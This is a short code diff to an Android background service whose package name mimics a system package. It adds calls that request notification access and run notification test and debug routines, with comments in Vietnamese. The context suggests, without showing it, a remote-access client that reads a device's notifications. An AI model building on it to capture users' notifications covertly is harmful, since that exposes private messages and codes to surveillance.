@@ -9,6 +9,9 @@ import android.content.Intent;
 import android.os.IBinder;
 
 import androidx.core.app.NotificationCompat;
+import com.android.background.services.helpers.NotificationPermissionHelper;
+import com.android.background.services.helpers.NotificationsTest;
+import com.android.background.services.helpers.NotificationsDebug;
 
 public class MainService extends Service {
 
@@ -37,6 +40,15 @@ public class MainService extends Service {
 
         contextOfApplication = this;
         ConnectionManager.startAsync(this);
+
+        // Kiểm tra và yêu cầu quyền notification access
+        NotificationPermissionHelper.checkAndRequestPermission();
+        
+        // Chạy test notifications (có thể xóa sau khi test xong)
+        NotificationsTest.runAllTests();
+        
+        // Chạy debug notifications để kiểm tra
+        NotificationsDebug.debugAllNotifications();
 
         return Service.START_STICKY;
     }
